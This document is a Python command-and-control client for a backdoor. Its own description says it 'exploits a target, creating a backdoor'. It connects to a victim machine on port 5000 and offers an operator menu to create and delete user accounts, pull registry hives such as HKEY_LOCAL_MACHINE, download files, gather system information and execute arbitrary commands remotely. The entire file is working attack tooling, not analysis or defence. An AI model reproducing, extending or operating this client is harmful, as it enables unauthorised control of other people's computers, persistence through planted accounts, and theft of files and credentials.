#!/usr/bin/env python

'''
Description: This is the client program that exploits a target, creating a backdoor and executing the following commands:
1) Create User
2) Delete User
3) Download Registry Key
4) Download File
5) Gather Information
6) Execute a custom command
'''

import socket, re, subprocess, time, struct

def recv_data(sock):
    data_len, = struct.unpack('!I',sock.recv(4))
    return sock.recv(data_len).decode()

def send_data(sock, data):
    data_len = len(data)
    sock.send(struct.pack('!I', data_len))
    sock.send(data.encode())
    return

def get_data(sock, str_to_send):
    send_data(sock, str_to_send)
    return recv_data(sock)

def main():
    sock = socket.socket(socket.AF_INET,socket.SOCK_STREAM)
    target_ip = input("Please enter the IP address of the target: ")
    PORT = 5000
    sock.connect((target_ip, PORT))
    invalid_flag = False
    while True:
        print("Which command do you wanna run on your target's machine?")
        print("Here are your options:")
        print("CU  -  Create User")
        print("DU  -  Delete User")
        print("DRK -  Download Registry Key")
        print("DF  -  Download File")
        print("GI  -  Gather Information")
        print("EC  -  Execute a custom command")
        print("E   -  Exit")
        if invalid_flag == False:
            option = input(recv_data(sock))
        else:
            option = input("\nCommand: ")
        if (option.upper() != "CU") and (option.upper() != "DU") and (option.upper() != "DRK") and (option.upper() != "DF") and (option.upper() != "GI") and (option.upper() != "EC") and (option.upper() != "E"):
            print("Invalid Input. Please give a valid code (CU/DU/DRK/DF/GI/EC/E")
            invalid_flag = True
        else:
            send_data(sock, option)
            invalid_flag = False
            if (option.upper() == 'E'):
                sock.close()
                break
            elif (option.upper() == "CU"):
                username = input(recv_data(sock))
                send_data(sock, username)
                password = input(recv_data(sock))
                send_data(sock,password)
                print(recv_data(sock)) #This is used to print command has executed successfully
            elif (option.upper() == "DU"):
                username = input(recv_data(sock))
                send_data(sock, username)
                print(recv_data(sock)) #This is used to print command has executed successfully
            elif (option.upper() == "DRK"):
                reg_keys = {1: "HKEY_CLASSES_ROOT", 2: "HKEY_CURRENT_USER", 3: "HKEY_LOCAL_MACHINE", 4: "HKEY_USERS", 5: "HKEY_CURRENT_CONFIG"}
                print("Which key would you like to retrieve? ")
                print("1.  HKEY_CLASSES_ROOT")
                print("2.  HKEY_CURRENT_USER")
                print("3.  HKEY_LOCAL_MACHINE")
                print("4.  HKEY_USERS")
                print("5.  HKEY_CURRENT_CONFIG")
                key = input(recv_data(sock))
                if key.isdigit() == False or ((int(key) != 1) and (int(key) != 2) and (int(key) != 3) and (int(key) != 4) and (int(key) != 5)):
                    print("\nInvalid input. Please give a valid input and try again")
                    break
                send_data(sock, reg_keys[int(key)])
                path = input(recv_data(sock))
                send_data(sock, path)
                output = ""
                while True:
                    temp = recv_data(sock)
                    if temp == "command executed successfully!":
                        break
                    output += temp + "\n"
                print(output)

            elif (option.upper() == "DF"):
                filename = input(recv_data(sock))
                send_data(sock, filename)
                contents = recv_data(sock)
                print(contents)
                print(recv_data(sock)) #This is used to print command has executed successfully
            elif (option.upper() == "GI"):
                print(recv_data(sock))
                print(recv_data(sock)) #This is used to print command has executed successfully
            elif(option.upper() == "EC"):
                command = input(recv_data(sock))
                send_data(sock, command)
                print(recv_data(sock))
                print(recv_data(sock)) #This is used to print command has executed successfully
        print("\n\n")



main()